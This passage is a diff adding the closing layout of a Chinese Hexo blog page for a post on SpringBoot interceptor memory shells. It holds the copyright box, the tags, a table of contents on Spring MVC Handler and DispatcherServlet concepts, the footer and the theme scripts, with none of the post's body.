+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/05/04/SpringBoot-Interceptor内存马/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">1diot9</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2025-05-04 19:44</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/05/04/JNI/"
+                                   title="JNI"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">JNI</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Handler-HandlerAdapter"><span class="nav-number">1.1.</span> <span class="nav-text">Handler&amp;HandlerAdapter</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Handler%EF%BC%88%E5%A4%84%E7%90%86%E5%99%A8%EF%BC%89"><span class="nav-number">1.1.1.</span> <span class="nav-text">Handler（处理器）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HandlerAdapter%EF%BC%88%E5%A4%84%E7%90%86%E5%99%A8%E9%80%82%E9%85%8D%E5%99%A8%EF%BC%89"><span class="nav-number">1.1.2.</span> <span class="nav-text">HandlerAdapter（处理器适配器）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Handler-%E5%92%8C-HandlerAdapter-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">1.1.3.</span> <span class="nav-text">Handler 和 HandlerAdapter 的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="nav-number">1.1.4.</span> <span class="nav-text">工作流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.1.5.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DispatcherServlet-%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">DispatcherServlet 的作用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DispatcherServlet-%E7%9A%84%E4%BD%9C%E7%94%A8-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">DispatcherServlet 的作用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DispatcherServlet-%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="nav-number">1.2.2.</span> <span class="nav-text">DispatcherServlet 的工作流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DispatcherServlet-%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="nav-number">1.2.3.</span> <span class="nav-text">DispatcherServlet 的初始化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DispatcherServlet-%E7%9A%84%E9%85%8D%E7%BD%AE"><span class="nav-number">1.2.4.</span> <span class="nav-text">DispatcherServlet 的配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DispatcherServlet-%E7%9A%84%E9%87%8D%E8%A6%81%E6%80%A7"><span class="nav-number">1.2.5.</span> <span class="nav-text">DispatcherServlet 的重要性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-1"><span class="nav-number">1.2.6.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">流程分析</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">1diot9</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">3.3k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Handler-HandlerAdapter"><span class="nav-number">1.1.</span> <span class="nav-text">Handler&amp;HandlerAdapter</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Handler%EF%BC%88%E5%A4%84%E7%90%86%E5%99%A8%EF%BC%89"><span class="nav-number">1.1.1.</span> <span class="nav-text">Handler（处理器）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HandlerAdapter%EF%BC%88%E5%A4%84%E7%90%86%E5%99%A8%E9%80%82%E9%85%8D%E5%99%A8%EF%BC%89"><span class="nav-number">1.1.2.</span> <span class="nav-text">HandlerAdapter（处理器适配器）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Handler-%E5%92%8C-HandlerAdapter-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">1.1.3.</span> <span class="nav-text">Handler 和 HandlerAdapter 的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="nav-number">1.1.4.</span> <span class="nav-text">工作流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.1.5.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DispatcherServlet-%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">DispatcherServlet 的作用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DispatcherServlet-%E7%9A%84%E4%BD%9C%E7%94%A8-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">DispatcherServlet 的作用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DispatcherServlet-%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="nav-number">1.2.2.</span> <span class="nav-text">DispatcherServlet 的工作流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DispatcherServlet-%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="nav-number">1.2.3.</span> <span class="nav-text">DispatcherServlet 的初始化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DispatcherServlet-%E7%9A%84%E9%85%8D%E7%BD%AE"><span class="nav-number">1.2.4.</span> <span class="nav-text">DispatcherServlet 的配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DispatcherServlet-%E7%9A%84%E9%87%8D%E8%A6%81%E6%80%A7"><span class="nav-number">1.2.5.</span> <span class="nav-text">DispatcherServlet 的重要性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-1"><span class="nav-number">1.2.6.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">流程分析</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+    
+<script src="/js/lazyload.js"></script>
+
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
